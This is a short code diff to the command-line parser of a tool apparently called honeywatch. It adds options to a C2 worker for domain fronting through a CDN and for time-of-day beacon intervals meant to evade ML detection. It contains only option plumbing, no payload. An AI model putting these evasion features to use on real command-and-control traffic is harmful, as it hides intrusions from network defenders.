@@ -352,6 +352,8 @@ def build_parser() -> argparse.ArgumentParser:
     p_worker.add_argument("--c2-encrypt", action="store_true", help="decrypt C2 tasks and encrypt results with NaCl or AES-256-GCM")
     p_worker.add_argument("--c2-key", default=None, help="passphrase for C2 encryption (must match the controller's key)")
     p_worker.add_argument("--adaptive-timing", action="store_true", help="adjust poll interval based on controller RTT (responsive=faster, slow=backoff)")
+    p_worker.add_argument("--domain-front", default=None, help="CDN front domain for domain fronting (e.g., cdn.cloudflare.com); connects to this domain but sends Host header for the real controller")
+    p_worker.add_argument("--human-timing", action="store_true", help="use time-of-day Gaussian beacon intervals to evade ML detection (short during business hours, long at night)")
     p_worker.set_defaults(func=_cmd_worker)
 
     # ----------------------------- deploy --------------------------------
@@ -1530,6 +1532,8 @@ def _cmd_worker(args, argv) -> int:
         c2_encrypt=c2_encrypt,
         c2_key=c2_key,
         adaptive_timing=args.adaptive_timing or getattr(workers_cfg, "adaptive_timing", False),
+        domain_front=args.domain_front or getattr(workers_cfg, "domain_front", None),
+        human_timing=args.human_timing or getattr(workers_cfg, "human_timing", False),
     )
     scheme = "mTLS" if ca_path else ("TLS" if url.lower().startswith("https") else "plaintext")
     print(f"honeywatch worker: connecting to {url} (categories={categories}, {scheme})")
